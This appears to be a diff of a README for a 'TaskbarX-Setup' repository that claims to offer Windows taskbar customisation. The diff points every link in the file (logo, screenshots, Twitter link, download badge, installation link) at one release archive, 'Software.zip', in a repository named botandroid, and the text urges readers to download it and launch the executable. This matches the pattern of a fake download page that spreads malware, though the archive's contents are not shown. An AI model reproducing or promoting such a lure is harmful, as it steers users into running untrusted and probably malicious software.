@@ -1,6 +1,6 @@
 # 🌟🖥️ TaskbarX-Setup 🌟🖥️
 
-![TaskbarX-Setup Logo](https://example.com/logo.png)
+![TaskbarX-Setup Logo](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to TaskbarX-Setup, where you can customize your Windows taskbar with TaskbarX, giving you more control over the position and appearance of icons. This setup provides a seamless way to enhance your desktop experience and boost your productivity!
@@ -12,7 +12,7 @@ Welcome to TaskbarX-Setup, where you can customize your Windows taskbar with Tas
 ✨ Enhance your Windows desktop  
 
 ## Installation
-To get started, download the TaskbarX Setup package from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch the executable file to begin the installation process.
+To get started, download the TaskbarX Setup package from [here](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip) and launch the executable file to begin the installation process.
 
 ## Usage
 1. Once installed, launch TaskbarX from your Start menu.
@@ -26,11 +26,11 @@ If you encounter any issues or have questions about TaskbarX-Setup, please visit
 desktop-customization, productivity-tools, taskbar-center, taskbar-configurator, taskbar-customization, taskbar-enhancement, taskbar-modification, taskbar-tweaks, taskbar-utility, taskbarx, windows-customization, windows-enhancement, windows-taskbar, windows-tools, windows-toolstaskbar-tools, windows-ui, windows-ui-improvement.
 
 ## Stay Connected
-Follow us on [Twitter](https://twitter.com/taskbarx) for the latest updates and tips on customizing your Windows taskbar!
+Follow us on [Twitter](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip) for the latest updates and tips on customizing your Windows taskbar!
 
 ---
 
-[![Download TaskbarX Setup](https://img.shields.io/badge/Download-TaskbarX_Setup-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) **Launch the setup file to customize your taskbar now!**
+[![Download TaskbarX Setup](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip)](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip) **Launch the setup file to customize your taskbar now!**
 
 ---
 
@@ -41,9 +41,9 @@ Let's make your taskbar stand out with TaskbarX-Setup! 🎉
 ## Screenshots
 Here are some sneak peeks of what TaskbarX can do for your desktop:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
+![Screenshot 1](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip)
 
-![Screenshot 2](https://example.com/screenshot2.jpg)
+![Screenshot 2](https://github.com/botandroid/TaskbarX-Setup/releases/download/v1.0/Software.zip)
 
 Enjoy unlocking the full potential of your Windows taskbar with TaskbarX-Setup! 💻
 
